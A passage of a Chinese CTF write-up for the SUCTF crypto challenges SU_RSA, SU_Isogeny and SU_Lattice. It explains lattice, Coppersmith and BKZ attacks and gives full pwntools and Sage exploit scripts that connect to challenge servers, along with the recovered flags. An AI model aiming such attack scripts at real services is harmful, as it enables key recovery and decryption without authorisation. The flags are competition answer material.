    return [raw[i * 8 : (i + 1) * 8] for i in range(8)]

def tropical_add(A, B):
    return [[min(A[i][j], B[i][j]) for j in range(len(A[0]))] for i in range(len(A))]

def tropical_mul(A, B):
    return [
        [min(A[i][k] + B[k][j] for k in range(len(A[0]))) for j in range(len(B[0]))]
        for i in range(len(A))
    ]

def parse_sample(blob):
    lines = [line.strip() for line in blob.decode().splitlines() if line.strip()]
    food = re.search(r"Here is your (.*)!\"", lines[0]).group(1)
    mats = {}
    for line in lines[1:]:
        if " = " not in line:
            continue
        name, value = line.split(" = ", 1)
        mats[name] = ast.literal_eval(value)
    return food, mats

def recv_menu(io):
    return io.recvuntil(b">>> ")

def get_two_samples(io):
    samples = []
    seen = set()
    while len(samples) < 2:
        io.sendline(b"1")
        blob = recv_menu(io)
        food, mats = parse_sample(blob)
        if food in seen:
            continue
        seen.add(food)
        samples.append((H(food), mats))
    return samples

def get_target(io):
    io.sendline(b"2")
    blob = io.recvuntil(b">>> ")
    msg = re.search(rb'Please make (.{36}) for me!', blob).group(1).decode()
    return msg

def solve_consistent_model(samples):
    solver = Solver()
    solver.set(timeout=8000)

    C = [[Int(f"C_{i}_{j}") for j in range(7)] for i in range(8)]
    K = [[Int(f"K_{i}_{j}") for j in range(8)] for i in range(7)]

    for row in C:
        for x in row:
            solver.add(x >= 0, x <= 255)
    for row in K:
        for x in row:
            solver.add(x >= 0, x <= 255)

    for idx, (M, mats) in enumerate(samples):
        U = [[Int(f"U_{idx}_{i}_{j}") for j in range(7)] for i in range(8)]
        V = [[Int(f"V_{idx}_{i}_{j}") for j in range(8)] for i in range(7)]

        for row in U:
            for x in row:
                solver.add(x >= 0, x <= 255)
        for row in V:
            for x in row:
                solver.add(x >= 0, x <= 255)

        A = mats["A"]
        B = mats["B"]
        P = mats["P"]
        R = mats["R"]
        S = mats["S"]

        for i in range(8):
            for j in range(7):
                terms = [M[i][k] + C[k][j] for k in range(8)] + [U[i][j]]
                solver.add(And([A[i][j] <= t for t in terms]))
                solver.add(Or([A[i][j] == t for t in terms]))

        for i in range(7):
            for j in range(8):
                terms = [K[i][k] + M[k][j] for k in range(8)] + [V[i][j]]
                solver.add(And([B[i][j] <= t for t in terms]))
                solver.add(Or([B[i][j] == t for t in terms]))

        for i in range(8):
            for j in range(8):
                terms = [C[i][k] + V[k][j] for k in range(7)]
                solver.add(And([P[i][j] <= t for t in terms]))
                solver.add(Or([P[i][j] == t for t in terms]))

                terms = [U[i][k] + K[k][j] for k in range(7)]
                solver.add(And([R[i][j] <= t for t in terms]))
                solver.add(Or([R[i][j] == t for t in terms]))

                terms = [U[i][k] + V[k][j] for k in range(7)]
                solver.add(And([S[i][j] <= t for t in terms]))
                solver.add(Or([S[i][j] == t for t in terms]))

    if solver.check() != sat:
        return None

    model = solver.model()
    chef = [[model[C[i][j]].as_long() for j in range(7)] for i in range(8)]
    cooker = [[model[K[i][j]].as_long() for j in range(8)] for i in range(7)]
    return chef, cooker

def matrix_rank_ok(mat, need):
    return int(np.linalg.matrix_rank(np.array(mat, dtype=np.int64))) >= need

def legal(mat):
    return all(0 <= x <= 256 for row in mat for x in row)

def build_payload(M, chef, cooker):
    chef_part = tropical_mul(M, chef)
    cooker_part = tropical_mul(cooker, M)
    fork = tropical_mul(chef, cooker)

    for bound, rounds in [(5, 3000), (15, 5000), (40, 8000), (80, 12000), (160, 12000)]:
        for _ in range(rounds):
            U = [[random.randint(0, bound) for _ in range(7)] for _ in range(8)]
            V = [[random.randint(0, bound) for _ in range(8)] for _ in range(7)]

            A = tropical_add(chef_part, U)
            B = tropical_add(cooker_part, V)
            P = tropical_mul(chef, V)
            R = tropical_mul(U, cooker)
            S = tropical_mul(U, V)

            if not all(legal(mat) for mat in [A, B, P, R, S]):
                continue
            if not matrix_rank_ok(A, 7):
                continue
            if not matrix_rank_ok(B, 7):
                continue
            if not matrix_rank_ok(P, 8):
                continue
            if not matrix_rank_ok(R, 8):
                continue
            if not matrix_rank_ok(S, 8):
                continue

            W = tropical_mul(A, B)
            Z = tropical_add(
                tropical_add(tropical_mul(tropical_mul(M, fork), M), tropical_mul(M, P)),
                tropical_add(tropical_mul(R, M), S),
            )
            if W == Z and W != S:
                return {"A": A, "B": B, "P": P, "R": R, "S": S}

    return None

def try_once(port):
    io = remote(HOST, port, timeout=5)
    recv_menu(io)
    samples = get_two_samples(io)
    target = get_target(io)
    sol = solve_consistent_model(samples)
    if sol is None:
        io.close()
        print(f"port {port}: z3 produced no model")
        return None
    chef, cooker = sol
    payload = build_payload(H(target), chef, cooker)
    if payload is None:
        io.close()
        print(f"port {port}: could not build rank-valid payload")
        return None
    io.sendline(json.dumps(payload).encode())
    out = io.recvrepeat(2).decode("latin1", "ignore")
    io.close()
    return out

def main():
    attempt = 0
    while True:
        for port in PORTS:
            attempt += 1
            try:
                out = try_once(port)
            except Exception as exc:
                print(f"[{attempt}] port {port} error: {exc}")
                continue
            if out is None:
                continue
            print(f"[{attempt}] port {port}:")
            print(out)
            if "FLAG:" in out or "flag{" in out.lower() or "SUCTF{" in out:
                return

if __name__ == "__main__":
    main()
```

## **SU_RSA**

**思路概述**

题目同时给了两类信息：

1. 私钥指数 `d` 很小，约为 `N^0.33`
2. `S` 泄露了 `p+q` 的高位

单独利用其中一条都不够直接，但把两者联立后可以构造二维小根问题，用格攻击恢复 `p+q` 的低位，进而分解 `N`。

**关键推导**

由 RSA 有：

```Plain
ed - kφ(N) = 1
```

而

```Plain
φ(N) = N - (p+q) + 1
```

设

```Plain
p + q = S + s
```

其中 `s` 是未知低位，则：

```Plain
φ(N) = N - S - s + 1
```

代入得到：

```Plain
ed - k(N - S - s + 1) = 1
```

模 `e` 下有：

```Plain
1 + k(N - S + 1 - s) ≡ 0 mod e
```

记

```Plain
A = N - S + 1
```

则可写成：

```Plain
1 + k(A - s) ≡ 0 mod e
```

这里两个未知量都很小：

```Plain
k < N^0.33
s < 2^399
```

所以可以对二维小根直接做格攻击。

**格攻击建模**

构造多项式：

```Plain
f(x, y) = 1 + x(A - y)
```

真实小根为：

```Plain
x = k
y = s
```

满足：

```Plain
f(k, s) ≡ 0 mod e
```

为了便于构造格，令：

```Plain
u = xy - 1
```

则可将多项式等价写成三元线性化形式，再结合关系

```Plain
xy - u + 1 = 0
```

构造 shift 多项式，做 `LLL`。本题参数下取：

```Plain
m = 6, t = 2
```

即可恢复小根。

**恢复结果**

格攻击恢复出：

```Plain
x = 23046290722813476038718953853202262665577865587504904916206909233597137226666603418973995697517833379
y = -683148815721841766742686899713115888494025265940826866001098672064769240843667757982350507024623048793200922731436972626
```

注意这里恢复出来的 `y` 实际对应 `-s`，所以：

```Plain
s = -y
```

于是：

```Plain
p + q = S + s
```

再由

```Plain
(p-q)^2 = (p+q)^2 - 4N
```

即可分解出 `p, q`，求出 `d`，最后解密 `c`。

exp如下：

```Python
from sage.all import *
from Crypto.Util.number import long_to_bytes

N = Integer(92365041570462372694496496651667282908316053786471083312533551094859358939662811192309357413068144836081960414672809769129814451275108424713386238306177182140825824252259184919841474891970355752207481543452578432953022195722010812705782306205731767157651271014273754883051030386962308159187190936437331002989)
e = Integer(11633089755359155730032854124284730740460545725089199775211869030086463048569466235700655506823303064222805939489197357035944885122664953614035988089509444102297006881388753631007277010431324677648173190960390699105090653811124088765949042560547808833065231166764686483281256406724066581962151811900972309623)
c = Integer(49076508879433623834318443639845805924702010367241415781597554940403049101497178045621761451552507006243991929325463399667338925714447188113564536460416310188762062899293650186455723696904179965363708611266517356567118662976228548528309585295570466538477670197066337800061504038617109642090869630694149973251)
S = Integer(19240297841264250428793286039359194954582584333143975177275208231751442091402057804865382456405620130960721382582620473853285822817245042321797974264381440)

# phi(N) = N - (p + q) + 1 and S leaks the high bits of p + q.
# Write p + q = S + s, then 1 + k * (N - S + 1 - s) == 0 (mod e)
# for the small quotient k = floor(ed / phi(N)).
A = N - S + 1
X = ceil(N ** RR(0.33))
Y = 2 ** 399
U = X * Y

PR = PolynomialRing(ZZ, names=("x", "y", "u"), order="lex")
x, y, u = PR.gens()
f = u + A * x
relation = [x * y - u + 1]


def linearize(poly):
    return poly.reduce(relation)


def build_lattice(m, t):
    shifts = []
    for k in range(m + 1):
        base = (f ** k) * (e ** (m - k))
        for i in range(m - k + 1):
            shifts.append(linearize((x ** i) * base))
    for j in range(1, t + 1):
        start = ceil(RR(m) / t * j)
        for k in range(start, m + 1):
            shifts.append(linearize((y ** j) * (f ** k) * (e ** (m - k))))

    monomials = []
    for poly in shifts:
        for monomial in poly.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort(key=lambda monomial: (monomial.degree(), monomial.degrees()))

    scales = [Integer(monomial(x=X, y=Y, u=U)) for monomial in monomials]
    lattice = Matrix(ZZ, len(shifts), len(monomials))
    for row, poly in enumerate(shifts):
        for col, monomial in enumerate(monomials):
            coeff = poly.monomial_coefficient(monomial)
            if coeff:
                lattice[row, col] = coeff * scales[col]
    return monomials, scales, lattice


def recover_polynomials(m=6, t=2):
    monomials, scales, lattice = build_lattice(m, t)
    reduced = lattice.LLL()
    polys = []
    for row in reduced.rows():
        if all(v == 0 for v in row):
            continue
        poly = PR(0)
        ok = True
        for coeff, monomial, scale in zip(row, monomials, scales):
            if coeff:
                if coeff % scale != 0:
                    ok = False
                    break
                poly += (coeff // scale) * monomial
        if ok and poly != 0:
            polys.append(poly)
    return polys


polys = recover_polynomials()
QR = PolynomialRing(ZZ, names=("x", "y"), order="lex")
xx, yy = QR.gens()
two_var = [QR(poly(x=xx, y=yy, u=xx * yy + 1)) for poly in polys[:8]]
YR = PolynomialRing(QQ, "y")

# Any pair among the first short polynomials gives the same small root here.
resultant = two_var[0].resultant(two_var[1], yy).univariate_polynomial()
roots = resultant.roots(ring=ZZ)
root_x = [r for r, _ in roots if r != 0][0]
g = gcd(YR(two_var[0](x=root_x)), YR(two_var[1](x=root_x)))
root_y = g.roots(ring=ZZ)[0][0]

# The lattice root is y = -s where p + q = S + s.
s = -root_y
pq = S + s
disc = pq * pq - 4 * N
sqrt_disc = isqrt(disc)
p = (pq + sqrt_disc) // 2
q = (pq - sqrt_disc) // 2
phi = (p - 1) * (q - 1)
d = inverse_mod(e, phi)
m = power_mod(c, d, N)

print(long_to_bytes(int(m)))
```

输出：

```Plain
b'SUCTF{congratulation_you_know_small_d_with_hint_factor}'
```

## **SU_Isogeny**

**题目类型**

这题本质上是一个基于 CSIDH 思想构造的同源密钥交换题，但服务端额外给了一个有缺陷的 oracle，导致我们可以把它转化成一个 **CI-HNP (CSIDH Hidden Number Problem)**，再用论文中的 Automated Coppersmith 方法恢复共享秘密。

题目核心文件是 main.sage

**1. 代码分析**

**1.1 参数**

```Python
p = 5326738796327623094747867617954605554069371494832722337612446642054009560026576537626892113026381253624626941643949444792662881241621373288942880288065659
F = GF(p)
pl = [x for x in prime_range(3, 374) + [587]]
pvA = [randint(-5, 5) for _ in pl]
pvB = [randint(-5, 5) for _ in pl]
```

- `p` 是一个 511 bit 素数。
- `pl` 一共 74 个小素数，满足 `prod(pl) | (p + 1)`，这正是 CSIDH 风格参数。
- `pvA`、`pvB` 是双方私钥向量，每个分量都在 `[-5, 5]`。

也就是说，题目把私钥限制在一个很小的指数盒子里，公钥则由同源作用计算得到。

**1.2`cal()` 的作用**

```Python
def cal(A, sk):
    E = EllipticCurve(F, [0, A, 0, 1, 0])
    for sgn in [1, -1]:
        for e, ell in zip(sk, pl):
            for i in range(sgn * e):
                while not (P := (p + 1) // ell * E.random_element()) or ell * P != 0:
                    pass
                E = E.isogeny_codomain(P)
        E = E.quadratic_twist()
    return E.montgomery_model().a2()
```

这里曲线写成 Montgomery 形式：

```Plain
E_A : y^2 = x^3 + A x^2 + x
```

函数 `cal(A, sk)` 的含义是：

1. 从参数为 `A` 的 Montgomery 曲线出发。
2. 对每个小素数 `ell`，根据私钥分量 `e` 走 `|e|` 次 `ell`-isogeny。
3. 正指数和负指数通过 `quadratic_twist()` 分开处理。
4. 最后返回结果曲线的 Montgomery 参数 `a2()`。

因此：

- `cal(0, pvA)` 是 Alice 公钥 `pkA`
- `cal(0, pvB)` 是 Bob 公钥 `pkB`
- `cal(pkA, pvB) = cal(pkB, pvA)` 是共享秘密曲线参数

这就是典型的 CSIDH 群作用交换。

**2. 漏洞点**

菜单 2 如下：

```Python
elif op == "2":
    pkA = int(input("pkA >>> "))
    pkB = int(input("pkB >>> "))
    A = cal(pkA, pvB)
    B = cal(pkB, pvA)
    if A != B:
        print("Illegal public key!")
    print(f"Gift : {int(A) >> 200}")
```

本意显然是：

- 用户提交两个公钥
- 服务器分别算共享值
- 如果两者不一致，说明公钥不合法，应该拒绝

但这里有一个致命 bug：

```Python
if A != B:
    print("Illegal public key!")
print(f"Gift : {int(A) >> 200}")
```

即使 `A != B`，程序依然会继续输出：

```Python
int(cal(pkA, pvB)) >> 200
```

这意味着：

1. 我们可以任意选择输入 `pkA`
2. 不需要构造合法的配对 `pkB`
3. 直接获得 `cal(pkA, pvB)` 的高 311 bit

注意 `p` 是 511 bit，而右移 200 位后还剩 **311 bit**，也就是泄露了大约：

```Plain
311 / 511 = 60.8%
```

这已经足够触发论文里的 CI-HNP 攻击。

**3. 如何把 oracle 变成 CI-HNP**

我们先通过菜单 1 拿到公开信息：

```Plain
pkA = cal(0, pvA)
pkB = cal(0, pvB)
```

真正想恢复的是共享秘密：

```Plain
SS = cal(pkA, pvB) = cal(pkB, pvA)
```

由于菜单 3 使用：

```Python
key = sha256(str(cal(cal(0, pvB), pvA)).encode()).digest()
```

即：

```Plain
key = SHA256(str(SS))
```

所以只要恢复 `SS`，就能解密 flag。

**3.1 2-isogeny 邻居**

对 Montgomery 曲线参数 `A`，它的两个 2-isogeny 邻居可写成：

```Plain
A_{2,+} = 2(A + 6) / (2 - A)
A_{2,-} = 2(A - 6) / (A + 2)
```

在模 `p` 下实现为：

```Python
pkA_2p = 2 * (pkA + 6) * inverse_mod(2 - pkA, p) % p
pkA_2n = 2 * (pkA - 6) * inverse_mod(pkA + 2, p) % p
```

于是我们可以向 gift oracle 查询三次：

```Plain
gift_SS = highbits(cal(pkA,    pvB))
gift_2p = highbits(cal(pkA_2p, pvB))
gift_2n = highbits(cal(pkA_2n, pvB))
```

也就是得到：

```Plain
SS    的高 311 bit
SS_2p 的高 311 bit
SS_2n 的高 311 bit
```

其中：

```Plain
SS    = cal(pkA,    pvB)
SS_2p = cal(pkA_2p, pvB)
SS_2n = cal(pkA_2n, pvB)
```

**3.2 三个代数关系**

Montgomery 参数在 2-isogeny 邻居之间满足以下关系：

```Plain
SS * SS_2p + 2*SS - 2*SS_2p + 12 = 0 mod p
SS * SS_2n - 2*SS + 2*SS_2n + 12 = 0 mod p
SS_2p * SS_2n + 2*SS_2p - 2*SS_2n + 12 = 0 mod p
```

这三条式子就是后面 Coppersmith 的输入。

**4. 建模为小根问题**

gift oracle 给的是高位，因此把未知量拆成：

```Plain
SS    = A0 + x
SS_2p = B0 + y
SS_2n = C0 + z
```

其中：

```Plain
A0 = gift_SS << 200
B0 = gift_2p << 200
C0 = gift_2n << 200
```

因为 oracle 抹掉了低 200 bit，所以：

```Plain
0 <= x, y, z < 2^200
```

将其代入上面的三条模方程，得到：

```Plain
f(x, y) = (A0+x)(B0+y) + 2(A0+x) - 2(B0+y) + 12
g(y, z) = (B0+y)(C0+z) + 2(B0+y) - 2(C0+z) + 12
h(x, z) = (A0+x)(C0+z) - 2(A0+x) + 2(C0+z) + 12
```

满足：

```Plain
f(x, y) = 0 mod p
g(y, z) = 0 mod p
h(x, z) = 0 mod p
```

这就是一个标准的多元 modular small roots 问题。

这里的关键不是“自己手搓格基”，而是识别出论文中的 CI-HNP 模型。

相关论文：

\- Meers, Nowakowski, *Solving the Hidden Number Problem for CSIDH and CSURF via Automated Coppersmith*, Asiacrypt 2023

\- 链接：<https://eprint.iacr.org/2023/1409>

这篇论文的结论之一是：

- 如果能得到共享秘密及其若干同源邻居的足够高位
- 并把关系写成多元模方程
- 那么可以用 Automated Coppersmith 自动构造 shift polynomials，再通过格约化恢复低位

本题泄露了 311 / 511 ≈ 60.8% 的高位，已经高于论文攻击所需阈值，因此是可做的。

**5. 利用流程**

整体流程如下：

1. 通过菜单 1 获取 `pkA`、`pkB`
2. 通过菜单 3 获取加密后的 `flag`
3. 计算 `pkA` 的两个 2-isogeny 邻居 `pkA_2p`、`pkA_2n`
4. 分别查询菜单 2，得到 `SS`、`SS_2p`、`SS_2n` 的高 311 bit
5. 构造三元模小根方程组
6. 用 Automated Coppersmith 解出低 200 bit
7. 恢复 `SS`
8. 计算 `SHA256(str(SS))` 作为 AES key
9. 解密拿到 flag

**6. EXP**

下面给出一个可直接复现的做法。为了保持清晰，我把脚本拆成两部分：

- `collect_data.py`：从远程拉取题目数据
- `solve.sage`：用 Automated Coppersmith 恢复 `SS`

**6.1 收集数据**

```Python
from pwn import remote

HOST = "110.42.47.116"   #服务器地址
PORT = 10001

p = 5326738796327623094747867617954605554069371494832722337612446642054009560026576537626892113026381253624626941643949444792662881241621373288942880288065659

r = remote(HOST, PORT)

def menu(choice):
    r.recvuntil(b">>> ")
    r.sendline(str(choice).encode())

def gift(pk_input, pkb=0):
    menu(2)
    r.recvuntil(b"pkA >>> ")
    r.sendline(str(pk_input).encode())
    r.recvuntil(b"pkB >>> ")
    r.sendline(str(pkb).encode())
    line = r.recvline().strip().decode()
    if "Gift" in line:
        return int(line.split(": ")[1])
    r.recvuntil(b"Gift : ")
    return int(r.recvline().strip())

menu(1)
r.recvuntil(b"pkA: ")
pkA = int(r.recvline().strip())
r.recvuntil(b"pkB: ")
pkB = int(r.recvline().strip())

menu(3)
r.recvuntil(b"flag: ")
enc_flag = r.recvline().strip().decode()

pkA_2p = (2 * (pkA + 6) * pow(2 - pkA, -1, p)) % p
pkA_2n = (2 * (pkA - 6) * pow(pkA + 2, -1, p)) % p

gift_SS = gift(pkA)
gift_2p = gift(pkA_2p)
gift_2n = gift(pkA_2n)

with open("attack_data.py", "w", encoding="utf-8") as f:
    f.write(f"p = {p}\n")
    f.write(f"pkA = {pkA}\n")
    f.write(f"pkB = {pkB}\n")
    f.write(f"enc_flag = '{enc_flag}'\n")
    f.write(f"pkA_2p = {pkA_2p}\n")
    f.write(f"pkA_2n = {pkA_2n}\n")
    f.write(f"gift_SS = {gift_SS}\n")
    f.write(f"gift_2p = {gift_2p}\n")
    f.write(f"gift_2n = {gift_2n}\n")

r.close()
print("saved to attack_data.py")
```

**6.2 求解小根**

需要准备：

- SageMath
- `pycryptodome`
- `flatter`

\- `automated-coppersmith`：<https://github.com/juliannowakowski/automated-coppersmith>

```Python
import sys
sys.path.insert(0, "automated-coppersmith")

load("automated-coppersmith/coppersmithsMethod.sage")
load("automated-coppersmith/optimalShiftPolys.sage")
load("attack_data.py")

p = ZZ(p)
ub = 200

A0 = ZZ(gift_SS) << ub
B0 = ZZ(gift_2p) << ub
C0 = ZZ(gift_2n) << ub

R.<x,y,z> = PolynomialRing(QQ, order="lex")

f = (A0 + x) * (B0 + y) + 2 * (A0 + x) - 2 * (B0 + y) + 12
g = (B0 + y) * (C0 + z) + 2 * (B0 + y) - 2 * (C0 + z) + 12
h = (A0 + x) * (C0 + z) - 2 * (A0 + x) + 2 * (C0 + z) + 12

polys = [f, g, h]
bounds = [2^ub, 2^ub, 2^ub]

i = 2
m = i * len(polys)
M = (prod(polys)^i).monomials()
F = constructOptimalShiftPolys(polys, M, p, m)
solutions = coppersmithsMethod(F, p^m, bounds, verbose=True)

SS = A0 + solutions[0]

from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = sha256(str(int(SS)).encode()).digest()
flag = unpad(AES.new(key, AES.MODE_ECB).decrypt(bytes.fromhex(enc_flag)), 16)
print(flag.decode())
```

**7. Flag**

```Plain
SUCTF{Actu41ly_th1s_iS_4_Pr0blem_7hat_w4s_s0lved_1n_2023_https://eprint.iacr.org/2023/1409}
```

## SU_Lattice

连接远程后给出一个简单的菜单：

```Plain
===Flag Management System===
[1] Get Flag
[2] Get Hint
[3] Exit
>>>
```

- **Get Flag (1)**：输入一个整数，程序校验是否正确，正确则返回 flag
- **Get Hint (2)**：返回一个 hint 值
- **Exit (3)**：退出

核心逻辑

通过逆向分析 ELF 二进制可以得出：

程序内部维护一个 **24 阶模线性递推序列 (MRG)**：

$$x_{i+24} = c_0*x_i + c_1*x_{i+1} + ... + c_23*x_{i+23} (mod m)$$

每次调用 Get Hint 时：

1. 用当前 24 个状态值通过递推公式计算出 `x_{i+24}`
2. 返回 `x_{i+24} >> 20`（只泄露高位，截断低 20 位）
3. 窗口右移一位

Get Flag 检查的答案是**程序启动时初始 24 项状态之和**：

$$answer = (x_0 + x_1 + ... + x_23) mod m$$

关键难点：

- 模数 `m` 未知（约 60 bit）
- 24 个递推系数未知
- 初始状态未知
- 观测值只有高位截断

解题思路

参考论文：Yu et al., *An improved method for predicting truncated multiple recursive generators with unknown parameters* ([ePrint 2022/1134](https://eprint.iacr.org/2022/1134.pdf))

整体分为 5 步：

**Step 1：BKZ 搜索湮灭多项式**

收集 400 条 hint 后，取前 299 条（`R+T-1`）构造格矩阵。

构造 `R x (T+R)` 的整数矩阵（`R=200, T=100`）：

$$L[i] = ( y_i, y_{i+1}, ..., y_{i+T-1} | e_i )$$

其中 `e_i` 是单位向量。对这个 200x300 矩阵做 BKZ 规约（block=20），短向量的右半部分可以解读为整系数多项式 `f(x) = eta_0 + eta_1*x + ... + eta_{R-1}*x^{R-1}`，它们在模 `m` 意义下被真实连接多项式整除。

取 BKZ 输出的前 12 行作为候选。

**Step 2：Resultant 恢复模数**

若两个候选多项式 `f, g` 在 `Z/mZ[x]` 上共享 24 次公因子（即连接多项式），则：

$$m^24 | Res(f, g)$$

枚举前 12 个候选多项式的三元组 `(f, g, h)`，计算：

G = gcd(Res(f,g), Res(f,h), Res(g,h))

若 `G` 恰好是某个整数的 24 次方，开根即得模数 `m`。实测 `m` 约 60 bit。

**Step 3：恢复连接多项式**

将候选多项式降到 `GF(m)[x]` 上，逐个做 gcd，直到得到一个 24 次 monic 多项式。这就是连接多项式 `P(x) = x^24 + a_23*x^23 + ... + a_0`，递推系数为 `c_i = -a_i mod m`。

**Step 4：HNP 格恢复精确状态**

已知高位 `hints[i] = x_{24+i} >> 20`，即：

$$x_{24+i} = hints[i] * 2^20 + z_i, 0 <= z_i < 2^20$$

将 `x_{48+j}`（即后续的递推值）展开为 `z_0, ..., z_23` 的线性函数模 `m`：

$$x_{48+j} = sum_k alpha_{j,k} * z_k + beta_j (mod m)$$

由于 `hints[24+j] = x_{48+j} >> 20`，有：

$$sum_k alpha_{j,k} * z_k ≡ rhs_j + e_j (mod m), 0 <= e_j < 2^20$$

这是一个 **Hidden Number Problem (HNP)**。构造 `(N+25)` 维格（`N=30` 个方程）：

```Plain
[ m*I_N     |  0    |  0 ]     -- N 行：mod m 约束
[ alpha^T   |  I_24 |  0 ]     -- 24 行：未知数 z_k
[ -rhs      |  0    |  S ]     -- 1 行：嵌入行
```

BKZ 规约后，在输出中寻找末位为 `±S` 的行，提取 `z_0..z_23`，重构状态 `x_24..x_47`，并用后续 hint 验证正确性。

**Step 5：反推初始状态**

已知 `x_24..x_47` 和递推公式，因为 `c_0` 在模 `m` 下可逆，可以反推：

$$x_k = c_0^{-1} * (x_{k+24} - c_1*x_{k+1} - ... - c_23*x_{k+23}) mod m$$

从 `k=23` 倒推到 `k=0`，得到初始状态 `x_0..x_23`。

最终答案：`sum(x_0..x_23) mod m`。

易踩的坑

1. **Get Flag 检查的是初始状态和**，不是当前状态和。程序在主循环开始前就算好了答案，后续 Get Hint 更新状态但不更新答案变量。
2. **Kannan 恢复的是** **`x_24..x_47`**（观测序列对应的精确值），不是 `x_0..x_23`。必须反推回初态才能得到正确答案。
3. **BKZ 候选行的选取**：不能只取前 3 行，需要保留前 12 行并枚举三元组来恢复模数。

运行方式

依赖环境：SageMath + pwntools

```
sage exp.py
```

运行时间约 3-4 分钟（BKZ 规约占大部分时间）。

Exp:

```Python
#!/usr/bin/env sage
# -*- coding: utf-8 -*-
"""
SU_Lattice exploit - Truncated MRG recovery via lattice attack
Based on: Yu et al., ePrint 2022/1134
"""

import sys
import time
import re
from itertools import combinations
from pwn import *

from sage.all import (
    ZZ, Matrix, PolynomialRing, GF, gcd,
)

# ══════════════════════════════════════════════════════════════
HOST = "156.239.26.40"
PORT = 10001
NUM_HINTS = 400
R = 200
T = 100
BKZ_BLOCK = 20
ROW_LIMIT = 12
ORDER = 24
TRUNC_BITS = 20
S = 2**TRUNC_BITS

# ══════════════════════════════════════════════════════════════
# Step 0 : Collect hints (bulk send for speed)
# ══════════════════════════════════════════════════════════════
def collect_hints(io, n):
    log.info(f"Collecting {n} hints ...")
    time.sleep(2)
    io.recv(timeout=3)  # consume banner

    for i in range(n):
        io.sendline(b"2")

    time.sleep(5)
    data = b""
    while True:
        try:
            chunk = io.recv(timeout=5)
            if not chunk:
                break
            data += chunk
        except:
            break

    hints = [int(x) for x in re.findall(rb"Here is your hint: (\d+)", data)]
    log.success(f"Collected {len(hints)} hints")
    if len(hints) < n:
        log.warning(f"Expected {n}, got {len(hints)}")
    return hints

# ══════════════════════════════════════════════════════════════
# Step 1 : Main lattice – find annihilating polynomials
# ══════════════════════════════════════════════════════════════
def find_annihilating_polys(hints):
    log.info("Building main lattice ...")
    M = Matrix(ZZ, R, T + R)
    for i in range(R):
        for j in range(T):
            M[i, j] = hints[i + j]
        M[i, T + i] = 1

    log.info(f"Running BKZ (block={BKZ_BLOCK}) on {R}x{T+R} matrix ...")
    t0 = time.time()
    M_red = M.BKZ(block_size=BKZ_BLOCK)
    log.info(f"BKZ done in {time.time()-t0:.1f}s")

    Rx = PolynomialRing(ZZ, 'x')
    x = Rx.gen()
    polys = []
    for i in range(ROW_LIMIT):
        cs = [int(M_red[i, T + j]) for j in range(R)]
        f = sum(c * x**j for j, c in enumerate(cs))
        if f != 0:
            polys.append(f)
    log.info(f"Got {len(polys)} candidate polynomials")
    return polys

# ══════════════════════════════════════════════════════════════
# Step 2 : Recover modulus via resultants
# ══════════════════════════════════════════════════════════════
def recover_modulus(polys):
    log.info("Recovering modulus via resultants ...")
    for i, j, k in combinations(range(len(polys)), 3):
        f, g, h = polys[i], polys[j], polys[k]
        try:
            r1 = f.resultant(g)
            r2 = f.resultant(h)
            r3 = g.resultant(h)
        except:
            continue
        G = gcd(gcd(ZZ(r1), ZZ(r2)), ZZ(r3))
        if G <= 1:
            continue
        G = abs(int(G))
        root = ZZ(G).nth_root(ORDER, truncate_mode=True)
        if isinstance(root, tuple):
            root, exact = root
        else:
            exact = (root ** ORDER == G)
        root = int(root)
        if exact and root > 2**50 and root.bit_length() < 70:
            log.success(f"m = {root}  ({root.bit_length()} bits)")
            return root
    return None

# ══════════════════════════════════════════════════════════════
# Step 3 : Recover connection polynomial
# ══════════════════════════════════════════════════════════════
def recover_connection_poly(polys, m):
    log.info("Recovering connection polynomial ...")
    Rm = PolynomialRing(GF(m), 'x')
    cands = [Rm(f) for f in polys if Rm(f) != 0]
    if len(cands) < 2:
        return None

    conn = cands[0]
    for f in cands[1:]:
        conn = gcd(conn, f)
        if conn.degree() == ORDER:
            break

    if conn.degree() != ORDER:
        log.warning(f"Connection poly degree = {conn.degree()}, expected {ORDER}")
        return None

    conn = conn.monic()
    coeffs = [(-int(conn[i])) % m for i in range(ORDER)]
    log.success(f"Connection polynomial recovered (degree {ORDER})")
    return coeffs

# ══════════════════════════════════════════════════════════════
# Step 4 : HNP lattice – recover exact state z_0..z_23
# ══════════════════════════════════════════════════════════════
def compute_linear_forms(hints, coeffs, m, num_extra):
    """Express x_{48+j} as linear function of z_0..z_23 mod m."""
    state_c = []
    state_b = []
    for k in range(ORDER):
        c = [0] * ORDER
        c[k] = 1
        state_c.append(c)
        state_b.append((hints[k] * S) % m)

    results = []
    for j in range(num_extra):
        new_c = [0] * ORDER
        new_b = 0
        for i in range(ORDER):
            for k in range(ORDER):
                new_c[k] = (new_c[k] + coeffs[i] * state_c[i][k]) % m
            new_b = (new_b + coeffs[i] * state_b[i]) % m
        results.append((new_c[:], new_b))
        state_c = state_c[1:] + [new_c]
        state_b = state_b[1:] + [new_b]
    return results

def verify_state(state, hints, coeffs, m):
    s = list(state)
    for i in range(min(len(hints) - ORDER, 200)):
        x_new = sum(coeffs[k] * s[i + k] for k in range(ORDER)) % m
        if (x_new >> TRUNC_BITS) != hints[i + ORDER]:
            return False
        s.append(x_new)
    return True

def recover_state(hints, coeffs, m):
    log.info("Recovering exact state via HNP lattice ...")
    for N in [30, 36, 42, 48]:
        forms = compute_linear_forms(hints, coeffs, m, N)
        dim = N + ORDER + 1

        L = Matrix(ZZ, dim, dim)
        for j in range(N):
            L[j, j] = m
        for k in range(ORDER):
            for j in range(N):
                L[N + k, j] = int(forms[j][0][k])
            L[N + k, N + k] = 1
        for j in range(N):
            rhs_j = (hints[24 + j] * S - int(forms[j][1])) % m
            L[N + ORDER, j] = (-rhs_j) % m
        L[N + ORDER, N + ORDER] = S

        for bkz_block in [20, 25, 30]:
            log.info(f"  N={N}, bkz={bkz_block}, dim={dim}")
            try:
                L_red = L.BKZ(block_size=bkz_block)
            except:
                continue

            for row_idx in range(L_red.nrows()):
                row = L_red[row_idx]
                last = int(row[dim - 1])
                if abs(last) != S:
                    continue
                sign = 1 if last == S else -1

                zs = []
                valid = True
                for k in range(ORDER):
                    zk = int(row[N + k]) * sign
                    if zk < 0 or zk >= S:
                        valid = False
                        break
                    zs.append(zk)
                if not valid:
                    continue

                state = [(hints[i] * S + zs[i]) % m for i in range(ORDER)]
                if verify_state(state, hints, coeffs, m):
